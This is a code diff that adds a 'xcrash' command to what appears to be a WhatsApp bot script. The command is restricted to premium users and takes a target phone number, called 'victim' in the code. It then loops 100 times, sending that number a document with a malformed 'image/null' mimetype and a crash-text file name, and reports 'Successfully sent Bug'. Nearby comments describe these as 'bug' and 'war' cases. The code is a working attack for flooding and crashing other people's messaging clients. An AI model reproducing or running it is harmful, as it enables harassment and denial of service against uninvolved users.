@@ -9011,6 +9011,27 @@ break
             //bug && war cases 
 //⚠️do not edit cases otherwise bug not work
 //bug cases 
+async function XeonyCrashy(dgxeon,chat) {
+    XeonBotInc.sendMessage(chat, {
+    document: {url: './settings.js'},
+    mimetype: `image/null`,
+    fileName: `${dgxeon}.${xeontext1}` ,
+    caption: `${dgxeon + xeontext1}`,
+    }, {quoted: subscribe_dgxeon })
+    }
+    
+case 'xcrash':{
+    if (!isPremium) return replygcxeon(mess.prem)
+     if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
+     victim = text.split("|")[0]+'@s.whatsapp.net'
+    amount = "100"
+    for (let i = 0; i < amount; i++) {
+    XeonyCrashy(pushname,victim)
+    await sleep(3000)
+    }
+    replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
+    }
+    break    
 case 'amountbug': {
     if (!isPremium) return replygcxeon(mess.premium)
     if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 919339619072`)
